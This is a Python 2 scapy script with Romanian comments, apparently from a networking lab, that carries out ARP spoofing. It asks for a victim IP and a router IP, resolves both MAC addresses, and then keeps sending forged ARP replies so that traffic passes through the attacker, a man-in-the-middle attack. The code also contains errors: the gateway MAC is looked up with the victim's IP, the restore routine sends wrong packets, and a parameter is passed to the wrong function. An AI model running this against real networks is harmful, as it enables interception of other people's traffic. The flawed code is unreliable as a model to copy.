from scapy.all import *
import os
import signal
import sys
import threading
import time

#scapy ajuta la "editarea" pachetelor => raspunsuri ARP
#ip de la rt1 = 198.13.0.14
#ruter ip de la mid1 = 198.13.0.15

#obtinere adrese mac
def get_mac(IP):
    conf.verb = 0 #initializare scapy
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, inter = 0.1)
    #ca la ex 2 + inter = rata de trimitere pachete; timeout = timp de expirare pachet
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%") #returneaza adresa mac

def reARP():
    print "\n[*] Refacere legaturi"
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff"), hwsrc = victimMAC, count = 7)
    send(ARP(op = 2, pdst = gateIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff"), hwsrc = gateMAC, count = 7)
    print "\n[*] Oprire IP forwarding"
    #os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    sys.exit(1)
    
#introducere man in the middle
#trimitere raspuns ARP tintelor, spunand ca noi suntem cealalta tinta => mijloc
def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = vm))
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gm))
    
def main():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        #os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")#in caz de se intampla ceva rau, oprim
        print "Nu se gaseste adresa MAC a victimei"
        sys.exit(1)
    try:
        gateMAC = get_mac(victimIP)
    except Exception:
        #os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")#in caz de se intampla ceva rau, oprim
        print "Nu se gaseste adresa MAC a gate-ului"
        sys.exit(1)    
    while 1:
        try:
            trick(gateMAC,victimMAC)
            time.sleep(1.5)#"cu un time.sleep de cateva secunde pentru a nu face flood de pachete."
        except KeyboardInterrupt:
            print "\n Oprire manuala"
            reARP()
            sys.exit(1)        
        
    
try:
    victimIP = raw_input("[*] Adresa IP a victimei: ")
    gateIP = raw_input("[*] Adresa IP a routerului: ")
except KeyboardInterrupt:
    print "\n Oprire manuala"
    sys.exit(1)

print "\n[*] Pornire IP Forwarding(mid 1 are deja optiunea setata)"
#os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") #ca in tutorialul de pe Medium, doar ca instructiunea e pentru linux, nu mac
main()
    

    
